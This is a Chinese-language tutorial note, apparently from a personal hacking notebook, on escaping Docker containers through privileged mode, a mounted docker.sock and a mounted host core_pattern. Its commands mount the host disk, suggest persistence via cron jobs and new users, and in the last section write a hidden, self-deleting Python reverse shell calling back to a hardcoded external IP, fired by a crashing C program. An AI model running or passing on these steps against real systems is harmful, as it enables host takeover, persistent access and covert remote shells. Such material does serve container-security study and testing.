---
{"dg-publish":true,"permalink":"/hack/云上攻防/云原生/docker/docker容器逃逸/"}
---

### 判断当前的web站点是否为docker搭建
#### 没有拿到权限
端口扫描工具扫描端口
docker映射出的端口服务有docker字样特征 如 80/nginx  80/docker-xxxx
应用对象表现
#### 拿到主机权限
##### 查看/proc/1/cgroup (可能由于权限或者其他原因无有效信息)
```
cat /proc/1/cgroup
```

##### 查看根目录是否有 .dockerenv文件
![](https://s2.loli.net/2024/01/17/WN2MsKTvkeYIwzq.png)

##### 利用mount查看挂载磁盘是否存在docker相关信息

![](https://s2.loli.net/2024/01/17/Qv5jITshwybBLSt.png)

##### 一键检测
```
cd / |ls -al | grep -qi docker && echo "Is Docker" || echo "Not Docker"
```

##### 其他方法：
https://blog.csdn.net/qq_23936389/article/details/131486643

### 三种容器逃逸方法

#### 1.特权模式启动导致
**--privileged=true**
若宿主机为其他权限，为了用root用去去启动docker 会开启特权模式启动
docker run --rm --privileged=true -it xxx
##### 启动靶场

```
docker run --rm --privileged=true -it alpine
```

![](https://s2.loli.net/2024/01/17/3xkVW7glyJPoHcL.png)

##### 检测环境是否为docker

```
cd / | ls -a
```

![](https://s2.loli.net/2024/01/17/XOGgxDbFLRtW1jC.png)
##### 判断特权：
```
cat /proc/self/status | grep CapEff
```
如果为**0000001fffffffff** 或者**0000003fffffffff**则为特权模式 若为其他则相反
![](https://s2.loli.net/2024/01/17/rxP54mlC3yk2HXb.png)

##### 查看目录&特权逃逸

```
fdisk -l
```

![](https://s2.loli.net/2024/01/17/2vJV76QM5gNKqdk.png)


```
mkdir /test   

mount /dev/vda1 /test
```
##### 成功逃逸
![](https://s2.loli.net/2024/01/17/DRhGatCxN7Updzq.png)

后续可通过添加计划任务&&添加用户进行权限维持
### 2.危险挂载导致逃逸
#### 1、挂载Docker Socket逃逸

Docker Socket 用来与守护进程通信即查询信息或者下发命令,如果运维人员挂载启动则会导致逃逸。

##### 挂载启动

```

docker run -itd --name with_docker_sock -v /var/run/docker.sock:/var/run/docker.sock ubuntu

```

##### 检测
如果存在这个文件则漏洞可能存在
```
ls -lah /var/run/docker.sock
```

##### 在容器里安装docker（套娃）
```
docker exec -it with_docker_sock /bin/bash
apt-get update
apt-get install curl
curl -fsSL https://get.docker.com/ | sh
```
##### 实现逃逸
```
docker run -it -v /:/host ubuntu /bin/bash
```
将宿主机目录挂载至/host下
#### 2.挂载宿主机procfs逃逸

procfs是一个伪文件系统，它动态反映着系统内进程及其他组件的状态，如果运维人员挂载启动则会导致逃逸。
##### 挂载启动

```
docker run -it -v /proc/sys/kernel/core_pattern:/host/proc/sys/kernel/core_pattern ubuntu
```

![](https://s2.loli.net/2024/01/19/NXYnkRECBfau2vK.png)
##### 检测

```
find / -name core_pattern
```

![](https://s2.loli.net/2024/01/19/XO89RErf5kjvdZK.png)

如果找到两个 core_pattern 文件，那可能就是挂载了宿主机的 procfs

##### 复现
找到docker工作的绝对路径
```
cat /proc/mounts | grep workdir
```
![](https://s2.loli.net/2024/01/19/8YO1UVjbG29oNxd.png)
```
/var/lib/docker/overlay2/1d76e10287e2f96513e5c76a54ff644aad61d6b1443d2f036bb8f7916e8d3ccb/work
```
创建一个反弹shell的 py脚本并写入到/tmp/.x.py内

```shell
cat >>/tmp/.x.py <<EOF
#!/usr/bin/python3
import  os
import pty
import socket
lhost = "182.92.11.124"
lport = 7777
def main():
   s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
   s.connect((lhost, lport))
   os.dup2(s.fileno(), 0)
   os.dup2(s.fileno(), 1)
   os.dup2(s.fileno(), 2)
   os.putenv("HISTFILE", '/dev/null')
   pty.spawn("/bin/bash")
   os.remove('/tmp/.x.py')
   s.close()
if __name__ == "__main__":
   main()
EOF

```
遇到乱码等情况可安装vim写入  
![](https://s2.loli.net/2024/01/19/ahszXYjAZTfm4HF.png)
给执行权限
```
chmod +x /tmp/.x.py
```

写入到proc 目录下
```
echo -e "|/var/lib/docker/overlay2/1d76e10287e2f96513e5c76a54ff644aad61d6b1443d2f036bb8f7916e8d3ccb/work/tmp/.x.py \rcore    " >  /host/proc/sys/kernel/core_pattern
```

创建x.c文件

```
cat >/tmp/x.c <<EOF
#include <stdio.h>

int main(void)  {
   int *a  = NULL;
   *a = 1;
   return 0;
}
EOF
```

安装gcc编译此文件
```
apt-get update -y && apt-get install  gcc -y

gcc x.c -o x

```

监听端口
![](https://s2.loli.net/2024/01/19/PeucW9zLVYGhQJd.png)
##### 实现逃逸
执行此文件
./x
成功反弹宿主机shell回来
![](https://s2.loli.net/2024/01/19/iKov256xdPCrHjQ.png)
